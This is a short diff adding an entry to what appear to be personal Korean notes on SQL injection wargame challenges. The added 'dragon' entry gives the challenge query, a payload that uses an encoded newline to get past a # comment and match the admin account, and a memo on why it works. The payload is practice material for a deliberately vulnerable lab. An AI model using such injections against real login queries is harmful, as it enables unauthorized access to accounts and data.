@@ -130,5 +130,13 @@ solve : ?pw=우왕굳
 memo : 한글 ascii
 
 
+dragon
+
+prob : select id from prob_dragon where id='guest'# and pw=''
+
+solve : ?pw='%0aand pw=12311312312312 or id='admin
+
+memo : %0a -> 줄바꿈  # -> 한줄 주석
+
 
 
